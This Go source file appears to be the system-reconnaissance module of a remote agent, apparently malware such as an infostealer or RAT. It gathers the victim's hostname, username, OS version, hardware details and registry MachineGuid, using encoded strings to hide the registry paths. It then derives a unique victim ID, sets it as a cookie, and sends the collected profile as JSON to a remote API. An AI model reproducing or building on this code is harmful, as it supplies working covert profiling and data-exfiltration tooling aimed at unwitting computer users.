package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"os"
	"os/user"
	"strings"

	"github.com/jaypipes/ghw"
	"golang.org/x/sys/windows/registry"
)

var info vars.TSystemInfo

func GetIP() {
	info.PublicIP = "Unknown"
	info.Country = "Unknown"
	info.Timezone = "Unknown"
	info.ISP = "Unknown"
}

func GetHardware() {
	info.CPU = "Unknown"
	info.GPU = "Unknown"
	info.Memory = "Unknown"

	cpu, err := ghw.CPU()
	if err == nil && len(cpu.Processors) > 0 {
		info.CPU = ""
		for _, p := range cpu.Processors {
			info.CPU += lib.Sprint(
				vars.Msg_Coresfmt, p.Vendor, p.Model, p.NumCores)
		}
	}

	mem, err := ghw.Memory()
	if err == nil {
		info.Memory = lib.BytesToHuman(mem.TotalUsableBytes)
	}

	gpu, err := ghw.GPU()
	if err == nil {
		info.GPU = ""
		for _, c := range gpu.GraphicsCards {
			info.GPU += c.DeviceInfo.Product.Name + " " + c.DeviceInfo.Vendor.Name + "\n"
		}
	}

	disk, err := ghw.Block()
	if err == nil {
		info.Disk = lib.Sprint(
			vars.Msg_Diskfmt, lib.BytesToHuman(int64(disk.TotalPhysicalBytes)), len(disk.Disks))
	}

	info.HWID = "Unknown"
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		lib.Decode(vars.Path_crypto), registry.QUERY_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return
	}
	defer key.Close()

	val, _, err := key.GetStringValue(
		lib.Decode(vars.Key_machineguid))
	if err != nil {
		return
	}

	info.HWID = val
}

func GetOS() {
	info.OS = "Unknown"

	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		lib.Decode(vars.Path_curver), registry.QUERY_VALUE)
	if err != nil {
		return
	}
	defer key.Close()

	cur, _, err := key.GetStringValue(
		lib.Decode(vars.Key_curver))
	if err != nil {
		return
	}

	prod, _, err := key.GetStringValue(
		lib.Decode(vars.Key_product))
	if err != nil {
		return
	}

	build, _, err := key.GetStringValue(
		lib.Decode(vars.Key_curbuild))
	if err != nil {
		return
	}

	info.OS = lib.Sprint(
		vars.Msg_OSfmt, prod, cur, build)
}

func GetSystemInfo() {
	var err error

	info.Hostname, err = os.Hostname()
	if err != nil {
		info.Hostname = "Unknown"
	}

	usr, err := user.Current()
	if err == nil {
		info.Username = usr.Username
		if strings.Contains(info.Username, "\\") && len(strings.Split(usr.Username, "\\")) >= 2 {
			info.Hostname = strings.Split(usr.Username, "\\")[0]
			info.Username = strings.Split(usr.Username, "\\")[1]
		}
	} else {
		info.Username = "Unknown"
	}

	GetOS()
	GetIP()
	GetHardware()
	vars.Agent.Sysinfo = info

	id := lib.GetMD5([]byte(info.HWID + info.Username + info.Hostname))[:15]
	err = api.SetCookie(id)
	if err != nil {
		lib.Print(vars.Msg_SetFail, err.Error())
		return
	}

	err = api.SendJSON(lib.Decode(vars.Module_system), struct {
		Sysinfo vars.TSystemInfo `json:"ST_MAP$json.sys_data$"`
	}{
		Sysinfo: vars.Agent.Sysinfo,
	})

	if err != nil {
		lib.Print(vars.Msg_FailSend,
			lib.Decode(vars.Module_system), err.Error())
	}

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_system))
}
